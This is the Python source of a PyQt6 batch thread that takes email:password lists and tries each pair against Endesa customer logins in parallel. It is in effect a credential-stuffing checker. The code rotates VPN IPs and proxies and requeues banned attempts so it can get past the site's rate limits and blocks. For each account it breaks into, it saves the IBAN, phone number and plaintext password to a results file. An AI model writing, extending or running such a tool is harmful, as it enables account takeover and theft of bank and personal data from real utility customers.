#!/usr/bin/env python3
"""Thread for batch processing Endesa credentials."""

import os
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, List, Tuple, Dict

from PyQt6.QtCore import QThread, pyqtSignal

from src.core.endesa import EndesaClient
from src.core.session_pool import SessionPool
from src.network.vpn_manager import VPNManager
from src.network.proxy_manager import ProxyManager


class BatchProcessorThread(QThread):
    """Thread for running batch processing without blocking the UI."""
    
    progress_updated = pyqtSignal(str)
    status_updated = pyqtSignal(str)
    stats_updated = pyqtSignal(int, int, int, int, float)  # success, failed, banned, total, rate
    progress_percentage = pyqtSignal(int)  # Progress percentage
    finished_processing = pyqtSignal(int, int, float)
    vpn_status_updated = pyqtSignal(str)  # VPN status updates
    
    def __init__(self, credentials_file: str, max_workers: int, output_file: str, 
                 max_retries: int = 3, retry_delay: float = 2.0, use_vpn: bool = False, 
                 proxy: Optional[str] = None, proxy_list: Optional[List[str]] = None):
        super().__init__()
        self.credentials_file = credentials_file
        self.max_workers = max_workers
        self.output_file = output_file
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.use_vpn = use_vpn
        self.proxy = proxy
        self.proxy_list = proxy_list or []
        self.vpn_manager = None
        self.running = True
        self.start_time = None
        
        # Initialize session pool for efficient session management
        # Pool size scales with workers but not 1:1 since sessions are shared
        pool_size = min(30, max(15, max_workers // 4))  # 15-30 sessions for any number of workers
        self.session_pool = SessionPool(pool_size=pool_size, max_workers=max_workers)
        
        # Initialize proxy manager (will be set from main window if proxies are enabled)
        self.proxy_manager = None
        self.proxy_strategy = "round_robin"  # Default strategy
        
    def run(self):
        """Run the batch processing with proper threading and memory management."""
        try:
            # Check if credentials file exists
            if not os.path.exists(self.credentials_file):
                self.status_updated.emit("Credentials file not found")
                return
            
            # Read all credentials from the file
            with open(self.credentials_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            # Parse credentials (email:password format)
            credentials = []
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if line and ':' in line:
                    email, password = line.split(':', 1)
                    credentials.append((email.strip(), password.strip(), line_num))
                elif line:  # Line exists but no colon - skip this line
                    self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
                    continue
            
            if not credentials:
                self.status_updated.emit("No valid credentials found in file")
                return
            
            total_credentials = len(credentials)
            self.status_updated.emit(f"Processing {total_credentials} credentials with {self.max_workers} workers...")
            
            self.start_time = time.time()
            successful = 0
            failed = 0
            banned = 0
            stats_update_counter = 0  # Add counter for batched stats updates
            
            # Initialize VPN if enabled
            if self.use_vpn:
                try:
                    self.vpn_manager = VPNManager()
                    self.progress_updated.emit("VPN initialized successfully")
                    
                    # Connect to first VPN location before starting processing
                    self.progress_updated.emit("VPN manager ready - will connect when needed")
              
                    
                except Exception as e:
                    self.progress_updated.emit(f"VPN initialization failed: {e}")
                    self.use_vpn = False
            
            # Process all credentials continuously without waiting for batch completion
            if self.use_vpn:
                # VPN mode: Process in batches with IP rotation and retry
                remaining_credentials = credentials.copy()
                retry_credentials = []  # Store credentials for retry (bans + timeouts)
                batch_count = 0
                max_retries = 3  # Maximum times to retry credentials
                global_retry_count = {}  # Persistent retry counter across all batches
                
                while (remaining_credentials or retry_credentials) and self.running:
                    # Prepare current batch: remaining + retry credentials
                    current_batch = []
                    
                    # Add remaining credentials first
                    if remaining_credentials:
                        batch_size = min(self.max_workers, len(remaining_credentials))
                        current_batch.extend(remaining_credentials[:batch_size])
                        remaining_credentials = remaining_credentials[batch_size:]
                    
                    # Add retry credentials if we have space
                    if retry_credentials and len(current_batch) < self.max_workers:
                        space_left = self.max_workers - len(current_batch)
                        retry_to_process = retry_credentials[:space_left]
                        current_batch.extend(retry_to_process)
                        retry_credentials = retry_credentials[space_left:]
                    
                    if not current_batch:
                        break
                    
                    batch_count += 1
                    self.progress_updated.emit(f"Processing batch {batch_count} of {len(current_batch)} credentials...")
                    
                    # Connect VPN for first batch, rotate IP for subsequent batches
                    if batch_count == 1:
                        # FIRST BATCH - Use the GENIUS IP verification method!
                        self.progress_updated.emit("🔗 Connecting to VPN with smart verification...")
                        if self.vpn_manager.connect_smart_with_verification():
                            self.progress_updated.emit("✅ VPN connected and verified!")
                        else:
                            self.progress_updated.emit("❌ VPN connection failed, continuing without VPN")
                            self.use_vpn = False  # Disable VPN for this session
                    else:
                        # SUBSEQUENT BATCHES - Rotate IP using simplified method
                        self.progress_updated.emit("🔄 Rotating IP for next batch...")
                        if self.vpn_manager.rotate_ip():
                            self.progress_updated.emit("✅ IP rotated successfully")
                        else:
                            self.progress_updated.emit("⚠️ IP rotation failed, continuing with current IP")
                    
                    # Process current batch and wait for completion (VPN mode)
                    batch_results, batch_retries = self._process_batch_with_retry_tracking(
                        current_batch, max_retries, global_retry_count)
                    
                    # Add new retries to the retry queue for next batch
                    retry_credentials.extend(batch_retries)
                    
                    # Update statistics
                    for result_type in batch_results:
                        if result_type == "SUCCESS":
                            successful += 1
                        elif result_type == "BANNED":
                            banned += 1
                        elif result_type == "INVALID":
                            failed += 1  # Count invalid as failed
                        elif result_type == "NO_DATA":
                            successful += 1  # Count no data as success (since we write it to file)
                        else:  # FAILED
                            failed += 1
                    
                    # Calculate progress
                    current_total = successful + failed + banned
                    progress_percent = int((current_total / total_credentials) * 100)
                    
                    # Update progress and statistics
                    self.progress_percentage.emit(progress_percent)
                    elapsed_time = time.time() - self.start_time
                    rate = current_total / elapsed_time if elapsed_time > 0 else 0
                    self.stats_updated.emit(successful, failed, banned, current_total, rate)
                    self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%) - Retry queue: {len(retry_credentials)}")
                    stats_update_counter += 1
                    if stats_update_counter >= 5 or current_total >= total_credentials:
                        self.progress_percentage.emit(progress_percent)
                        elapsed_time = time.time() - self.start_time
                        rate = current_total / elapsed_time if elapsed_time > 0 else 0
                        self.stats_updated.emit(successful, failed, banned, current_total, rate)
                        self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                        stats_update_counter = 0
            else:
                # Normal mode: Process all credentials continuously without waiting
                self.progress_updated.emit("Starting continuous processing (normal mode)...")
                
                # Use ThreadPoolExecutor for continuous processing
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    # Submit all tasks to the thread pool
                    future_to_credential = {}
                    for email, password, line_num in credentials:
                        if not self.running:
                            break
                        
                        future = executor.submit(self._process_single_credential, email, password, line_num)
                        future_to_credential[future] = (email, line_num)
                    
                    # Process completed tasks immediately as they finish (non-blocking)
                    while future_to_credential and self.running:
                        # Check for completed futures without blocking
                        done_futures = []
                        for future in list(future_to_credential.keys()):
                            if future.done():
                                done_futures.append(future)
                        
                        # Process all completed futures immediately
                        for future in done_futures:
                            try:
                                result, result_type = future.result(timeout=0.1)  # Non-blocking
                                email, line_num = future_to_credential[future]
                                
                                # Write result immediately to file (only write SUCCESS and NO_DATA)
                                if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                                    self._write_result_to_file(result)
                                
                                # Emit the actual result message
                                self.progress_updated.emit(result)
                                
                                # Update statistics
                                if result_type == "SUCCESS":
                                    successful += 1
                                elif result_type == "BANNED":
                                    banned += 1
                                elif result_type == "INVALID":
                                    failed += 1  # Count invalid as failed
                                elif result_type == "NO_DATA":
                                    successful += 1  # Count no data as success (since we write it to file)
                                else:  # FAILED
                                    failed += 1
                                
                                # Calculate progress
                                current_total = successful + failed + banned
                                progress_percent = int((current_total / total_credentials) * 100)
                                
                                # Increment stats counter
                                stats_update_counter += 1
                                
                                # Update progress and statistics (batched for performance)
                                if stats_update_counter >= 5 or current_total >= total_credentials:
                                    self.progress_percentage.emit(progress_percent)
                                    elapsed_time = time.time() - self.start_time
                                    rate = current_total / elapsed_time if elapsed_time > 0 else 0
                                    self.stats_updated.emit(successful, failed, banned, current_total, rate)
                                    self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                                    stats_update_counter = 0
                                
                                # Remove from tracking
                                del future_to_credential[future]
                        
                            except Exception as e:
                                email, line_num = future_to_credential[future]
                                result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                                self._write_result_to_file(result)
                                self.progress_updated.emit(result)
                                
                                failed += 1
                                current_total = successful + failed + banned
                                progress_percent = int((current_total / total_credentials) * 100)
                                self.progress_percentage.emit(progress_percent)
                                elapsed_time = time.time() - self.start_time
                                rate = current_total / elapsed_time if elapsed_time > 0 else 0
                                self.stats_updated.emit(successful, failed, banned, current_total, rate)
                                self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                                
                                # Remove from tracking
                                del future_to_credential[future]
                        
                        # Small sleep to prevent busy waiting
                        if not done_futures:
                            time.sleep(0.001)  # 1ms instead of blocking
            
            # Disconnect VPN if enabled
            if self.use_vpn and self.vpn_manager:
                try:
                    self.vpn_manager.disconnect()
                except Exception as e:
                    self.progress_updated.emit(f"VPN disconnect error: {e}")
            
            end_time = time.time()
            total_time = end_time - self.start_time
            
            self.finished_processing.emit(successful, failed, total_time)
            
        except Exception as e:
            self.status_updated.emit(f"Error: {str(e)}")
    
    def _process_batch_with_retry_tracking(self, batch_credentials, max_retries, global_retry_count):
        """Process a batch of credentials with retry tracking for bans and timeouts."""
        results = []
        new_retries = []  # Collect new retries for next batch
        
        # Use ThreadPoolExecutor for true parallel processing
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks to the thread pool
            future_to_credential = {}
            for email, password, line_num in batch_credentials:
                if not self.running:
                    break
                
                future = executor.submit(self._process_single_credential, email, password, line_num)
                future_to_credential[future] = (email, password, line_num)
            
            # Process completed tasks immediately as they finish (non-blocking)
            while future_to_credential:
                if not self.running:
                    break
                
                # Check for completed futures without blocking
                done_futures = []
                for future in list(future_to_credential.keys()):
                    if future.done():
                        done_futures.append(future)
                
                # Process all completed futures immediately
                for future in done_futures:
                    try:
                        result, result_type = future.result(timeout=0.1)  # Non-blocking
                        email, password, line_num = future_to_credential[future]
                        
                        # Handle retry logic for bans and timeouts - collect for NEXT batch only
                        if result_type in ["BANNED", "TIMEOUT"]:
                            # Check if we should retry this credential in the NEXT batch
                            current_retry_count = global_retry_count.get((email, line_num), 0)
                            if current_retry_count < max_retries:
                                # Add to new retries for next batch (after IP rotation)
                                new_retries.append((email, password, line_num))
                                global_retry_count[(email, line_num)] = current_retry_count + 1
                                retry_type = "BANNED" if result_type == "BANNED" else "TIMEOUT"
                                self.progress_updated.emit(f"{retry_type}: Line {line_num} - {email} - Will retry in next batch (attempt {current_retry_count + 1}/{max_retries})")
                                # Don't add to results - this will be retried
                                continue  # Skip adding to results
                            else:
                                # Max retries reached, count as permanently failed
                                retry_type = "BANNED" if result_type == "BANNED" else "TIMEOUT"
                                self.progress_updated.emit(f"{retry_type}: Line {line_num} - {email} - Max retries reached ({max_retries}), giving up")
                                # Count as banned if it was a ban, otherwise as failed
                                result_type = "BANNED" if result_type == "BANNED" else "FAILED"
                        
                        # Write result immediately to file (only write SUCCESS and NO_DATA)
                        if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
                            self._write_result_to_file(result)
                        
                        # Emit the actual result message
                        self.progress_updated.emit(result)
                        
                        # Add to results
                        results.append(result_type)
                        
                        # Remove from tracking
                        del future_to_credential[future]
                        
                    except Exception as e:
                        email, password, line_num = future_to_credential[future]
                        result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                        self._write_result_to_file(result)
                        
                        # Emit the actual result message
                        self.progress_updated.emit(result)
                        
                        results.append("FAILED")
                        
                        # Remove from tracking
                        del future_to_credential[future]
                
                # Small sleep to prevent busy waiting
                if not done_futures:
                    time.sleep(0.001)  # 1ms instead of blocking
        
        return results, new_retries
    
    def _process_single_credential(self, email: str, password: str, line_num: int) -> Tuple[str, str]:
        """Process a single credential - this runs in a separate thread."""
        current_proxy = None
        try:
            # Get proxy from proxy manager if available
            if self.proxy_manager:
                if self.proxy_strategy == "random":
                    current_proxy = self.proxy_manager.get_random_proxy()
                elif self.proxy_strategy == "best_performance":
                    current_proxy = self.proxy_manager.get_best_proxy()
                else:  # round_robin
                    current_proxy = self.proxy_manager.get_next_proxy()
            else:
                current_proxy = self.proxy
            
            # Normalize proxy format if needed
            normalized_proxy = None
            if current_proxy and self.proxy_manager:
                normalized_proxy = self.proxy_manager._normalize_proxy_for_requests(current_proxy)
            elif current_proxy:
                # Fallback normalization if no proxy manager
                if '://' not in current_proxy:
                    if '@' in current_proxy:
                        normalized_proxy = f"http://{current_proxy}"
                    elif current_proxy.count(':') >= 3:
                        parts = current_proxy.split(':')
                        host, port = parts[0], parts[1]
                        auth = ':'.join(parts[2:])
                        normalized_proxy = f"http://{auth}@{host}:{port}"
                    elif current_proxy.count(':') == 1:
                        normalized_proxy = f"http://{current_proxy}"
                    else:
                        normalized_proxy = current_proxy
                else:
                    normalized_proxy = current_proxy
            
            # Use session pool with context manager for efficient session management
            with EndesaClient(email, password, self.session_pool, self.max_retries, 
                             self.retry_delay, normalized_proxy) as client:
                
                # Step 1: Try to login first with retry mechanism
                try:
                    client.login()
                    login_successful = True
                except Exception as login_error:
                    login_successful = False
                    error_msg = str(login_error)
                    
                    # Check for banned accounts (after all retries failed)
                    if "BANNED:" in error_msg:
                        result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                        
                        # Mark proxy as failed if used
                        if current_proxy and self.proxy_manager:
                            self.proxy_manager.mark_proxy_failed(current_proxy)
                        
                        return result, "BANNED"
                    # Check for timeout errors - these should be retried
                    elif "timeout" in error_msg.lower() or "timed out" in error_msg.lower():
                        result = f"TIMEOUT: Line {line_num} - {email} - {error_msg}"
                        
                        # Mark proxy as failed if used
                        if current_proxy and self.proxy_manager:
                            self.proxy_manager.mark_proxy_failed(current_proxy)
                        
                        return result, "TIMEOUT"  # Mark for retry
                    # Check for specific "Invalid URL '/sites/Satellite'" error - this is the only one we count as invalid
                    elif "invalid url '/sites/satellite'" in error_msg.lower():
                        result = f"INVALID: Line {line_num} - {email} - Invalid URL Satellite"
                        return result, "INVALID"
                    # All other login failures - don't write these to file
                    else:
                        result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
                        return result, "FAILED"  # Count as failed but don't write to file
                
                # Step 2: Only continue with data retrieval if login was successful
                if login_successful:
                    try:
                        account_info = client.get_account_info()
                        
                        # Format result with password included
                        result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
                        
                        # Mark proxy as successful if used
                        if current_proxy and self.proxy_manager:
                            self.proxy_manager.mark_proxy_success(current_proxy)
                        
                        return result, "SUCCESS"
                        
                    except Exception as data_error:
                        error_msg = str(data_error)
                        # Check for banned accounts during data retrieval (after all retries failed)
                        if "BANNED:" in error_msg:
                            result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                            
                            # Mark proxy as failed if used
                            if current_proxy and self.proxy_manager:
                                self.proxy_manager.mark_proxy_failed(current_proxy)
                            
                            return result, "BANNED"
                        # Check for "no retrieve data" cases - write these to file
                        elif "no retrieve data" in error_msg.lower() or "data not found" in error_msg.lower():
                            result = f"NO_DATA: Line {line_num} - {email}:{password} - No data retrieved"
                            
                            # Mark proxy as successful if used (since we got a valid response)
                            if current_proxy and self.proxy_manager:
                                self.proxy_manager.mark_proxy_success(current_proxy)
                            
                            return result, "NO_DATA"
                        else:
                            result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
                            return result, "FAILED"
                            
        except Exception as e:
            result = f"ERROR: Line {line_num} - {email} - {str(e)}"
            
            # Mark proxy as failed if used
            if current_proxy and self.proxy_manager:
                self.proxy_manager.mark_proxy_failed(current_proxy)
            
            return result, "FAILED"
    
    def _write_result_to_file(self, result: str):
        """Write a single result immediately to file."""
        try:
            with open(self.output_file, "a", encoding='utf-8') as f:
                f.write(result + "\n")
        except Exception as e:
            self.progress_updated.emit(f"ERROR: Failed to write to file - {str(e)}")
    
    def get_proxy_stats(self):
        """Get proxy statistics from the proxy manager."""
        if self.proxy_manager:
            return self.proxy_manager.get_proxy_stats()
        return {}
    
    def get_healthy_proxy_count(self):
        """Get the number of healthy proxies."""
        if self.proxy_manager:
            return self.proxy_manager.get_healthy_proxy_count()
        return 0
    
    def stop(self):
        """Stop the processing safely."""
        try:
            self.running = False
            # Clean up session pool
            if hasattr(self, 'session_pool') and self.session_pool:
                self.session_pool.close_all()
            # The thread will naturally exit when the while loop condition becomes false
        except Exception as e:
            # If anything goes wrong, just set running to False
            self.running = False 